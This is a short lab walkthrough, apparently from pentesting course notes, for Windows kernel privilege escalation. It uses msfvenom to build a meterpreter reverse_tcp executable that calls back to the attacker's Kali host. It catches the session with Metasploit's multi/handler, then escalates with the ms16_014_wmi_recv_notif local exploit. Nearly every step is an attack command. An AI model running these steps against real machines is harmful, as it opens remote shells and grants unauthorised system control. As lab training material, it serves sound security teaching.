#Windows #PrivEsc #kernel 

## **Establish a shell**  

Kali VM

1. Open command prompt and type: `msfconsole`  
2. In Metasploit (msf > prompt) type: `use multi/handler`  
3. In Metasploit (msf > prompt) type: `set payload windows/x64/meterpreter/reverse_tcp`  
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`  
5. In Metasploit (msf > prompt) type: `run`  
6. Open an additional command prompt and type: `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe > shell.exe`  
7. Copy the generated file, `shell.exe`, to the Windows VM.  

Windows VM

1. Execute `shell.exe` and obtain reverse shell

## **Detection & Exploitation**  

Kali VM

1. In Metasploit (msf > prompt) type: `run` the msf module `post/multi/recon/local_exploit_suggester`
	1. Identify `exploit/windows/local/ms16_014_wmi_recv_notif` as a potential privilege escalation  
2. In Metasploit (msf > prompt) type: `use exploit/windows/local/ms16_014_wmi_recv_notif`  
3. In Metasploit (msf > prompt) type: `set SESSION [meterpreter SESSION number]`  
4. In Metasploit (msf > prompt) type: `set LHOST tun0`  
5. In Metasploit (msf > prompt) type: `set LPORT 5555`  
6. In Metasploit (msf > prompt) type: `run`

*NOTE: The shell might default to your eth0 during this attack.  If so, ensure you type `set lhost [Kali VM IP Address]` and run again.*